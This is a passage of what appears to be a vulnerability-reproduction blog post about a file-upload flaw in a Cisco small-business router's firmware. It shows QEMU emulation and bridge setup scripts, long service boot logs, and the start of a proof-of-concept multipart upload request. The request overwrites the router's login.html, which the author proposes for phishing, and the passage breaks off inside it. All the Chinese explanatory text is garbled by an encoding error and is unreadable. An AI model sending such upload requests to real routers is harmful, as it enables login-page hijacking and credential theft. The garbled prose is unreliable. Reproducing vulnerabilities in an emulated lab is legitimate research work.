<span class="keyword">return</span> <span class="number">-2</span>;</span><br></pre></td></tr></table></figure><p>è¦æ±‚æ˜¯ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œå› æ­¤åœ¨forkçš„æ—¶å€™çœ‹ä¸€çœ¼</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331163.png" alt="image-20240811225528001"></p><p>æ‰€ä»¥åªèƒ½æ˜¯0000000001äº†ï¼Œè¿˜æ˜¯è¦åå¤åŒ¹é…æ‰æ˜¯æ­£ç¡®çš„</p><h1 id="ä»¿çœŸ"><a href="#ä»¿çœŸ" class="headerlink" title="ä»¿çœŸ"></a>ä»¿çœŸ</h1><p>åœ¨è¿™é‡Œ<a href="https://people.debian.org/~aurel32/qemu/armhf/">ä¸‹è½½</a>ï¼Œå‹ç¼©çš„linuxå†…æ ¸æ˜ åƒï¼Œæ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸æ˜ åƒï¼Œarmç»“æ„è¦å¤šä¸‹ä¸€ä¸ªiå¼€å¤´çš„æ–‡ä»¶ï¼Œæ¶‰åŠåˆ°æ›´åº•å±‚çš„çŸ¥è¯†äº†ä¼°è®¡ã€‚</p><p>é…ç½®ç½‘ç»œç¯å¢ƒï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># è®¾ç½® br0 çš„ hello æ—¶é—´</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># å¯ç”¨ br0 æ¥å£</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># å¯ç”¨ç½‘å¡æ¥å£</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># å¯ç”¨ tap0 æ¥å£</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿è¡Œ </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/mmcblk0p2&quot;</span> \</span><br><span class="line">  -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4 </span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºï¼Œä½†æ˜¯æˆ‘å‡ºäº†ä¸€ä¸ªæŠ¥é”™<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331164.png" alt="956b1a9956ce270fe8f2f05939a66989"></p><p>pulseaudioæ˜¯éŸ³é¢‘è®¾å¤‡ï¼Œæƒ³æ¥ä½ ä¹Ÿä¸éœ€è¦ç”¨qemuæœºçœ‹ç”µå½±ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯æ²¡æœ‰ä»€ä¹ˆå½±å“çš„ï¼ŒæŠŠrootfså‹ç¼©å¥½scpä¼ ä¸Šæ¥</p><p>ä¹‹ååœ¨æœºå­é‡Œè¿è¡Œè€å‡ æ ·å»ºç«‹éš”ç¦»ç¯å¢ƒ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs/</span><br><span class="line">mount --<span class="built_in">bind</span> /proc proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev dev</span><br><span class="line"><span class="built_in">chroot</span> . /bin/sh</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/boot boot</span><br><span class="line">generate_default_cert</span><br><span class="line">/etc/init.d/confd start</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>æ€ä¹ˆæ¥çš„å‘¢ï¼Œé¦–å…ˆæ˜¯æ‰§è¡Œnginxï¼Œå‘ç°æ— æ³•è®¿é—®httpé¡µé¢ï¼Œå°±å»ä¾æ¬¡ä¿®æ”¹æŠ¥é”™</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /etc/init.d/boot boot</span></span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">mount: mounting debugfs on /sys/kernel/debug failed: No such file or directory</span><br><span class="line">Mounting mnt partitions..mount: mounting /dev/mtdblock9 on /mnt/configcert failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock10 on /mnt/avcsign failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock11 on /mnt/webrootdb failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock12 on /mnt/license failed: No such device</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/etc/ssl/private/*<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/.KEYS_DIR_TMP/*&#x27;</span>: No such file or directory</span><br><span class="line">uci: Parse error (option/list <span class="built_in">command</span> found before the first section) at line 2492, byte 1</span><br><span class="line"> create_meta_data_xml begin</span><br><span class="line"> meta_data_gen_state: 0</span><br><span class="line"> meta_data_gen_state: 1</span><br><span class="line"> create_meta_data_xml end</span><br><span class="line">/ <span class="comment"># generate_default_cert</span></span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">/usr/bin/certscript: line 1: can<span class="string">&#x27;t create /tmp/stats/certstats.tmp: nonexistent directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">Default</span><br><span class="line">/ <span class="comment"># /etc/init.d/confd start</span></span><br><span class="line"></span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /avc-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /device-os-types --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /webfilter-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span>: can<span class="string">&#x27;t remove &#x27;</span>/tmp/update.sh<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Parse error (option/list command found before the first section) at line 2492, byte 1</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/etc/syslog_config_template&#x27;</span>: No such file or directory</span><br><span class="line">sed: /tmp/syslog-ng.conf: No such file or directory</span><br><span class="line">Error opening configuration file; filename=<span class="string">&#x27;/tmp/syslog-ng.conf&#x27;</span>, error=<span class="string">&#x27;Success (0)&#x27;</span></span><br><span class="line">SIOCGMIIPHY: No such device</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">0</span><br><span class="line">json_object_from_file: error reading file /tmp/webcache/dep: No such file or directory</span><br><span class="line">PnP Agent is starting!</span><br><span class="line"></span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line">/ <span class="comment"># /etc/init.d/nginx start</span></span><br><span class="line"><span class="built_in">chown</span>: /var/firmware: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/3g-4g-driver: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/in_certs: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/signature: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/language-pack: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/configuration: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /firewall-basic-settings:firewall/remote-web-management/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-restconf:ciscosb-restconf/transport/https/cert does not exist, in function do_maapi_get, line 1463</span></span><br><span class="line"><span class="string">touch: /tmp/stats/certstats.tmp: No such file or directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-netconf:ciscosb-netconf/transport/ssh/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5708)</span></span><br><span class="line"><span class="string">mapped 321280 bytes (313 KB) for 4 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: preforking ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5707)</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI path: /www/cgi-bin/upload.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5709)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5718, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5719, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 2 (pid: 5721, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5720, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 3 (pid: 5722, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 4 (pid: 5723, cores: 1)</span></span><br></pre></td></tr></table></figure><h1 id="æ¼æ´çš„åˆ©ç”¨"><a href="#æ¼æ´çš„åˆ©ç”¨" class="headerlink" title="æ¼æ´çš„åˆ©ç”¨"></a>æ¼æ´çš„åˆ©ç”¨</h1><h2 id="Poc1"><a href="#Poc1" class="headerlink" title="Poc1"></a>Poc1</h2><p>æ­¤æ—¶èƒ½å¤Ÿè¦†ç›–ä¸€ä¸ª.htmlæ–‡ä»¶ï¼Œé‚£ä¹ˆhtmlæ–‡ä»¶å¯ä»¥é€šè¿‡jsæ¥é’“é±¼ï¼Œä½†æ˜¯è§†è§‰æ•ˆæœæ²¡é‚£ä¹ˆå¥½ï¼Œå› æ­¤å°±å†™ä¸€ä¸ªå°é¡µé¢å§</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331165.png" alt="image-20240811230535572"></p><p>åˆ°æœ€åä¼šæ‰§è¡Œ<code>mv -f /tmp/upload/0000000001 /tmp/www//login.html</code>ä¾¿æ˜¯å¤ç°æˆåŠŸäº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">/tmp/upload/0000000001</span><br><span 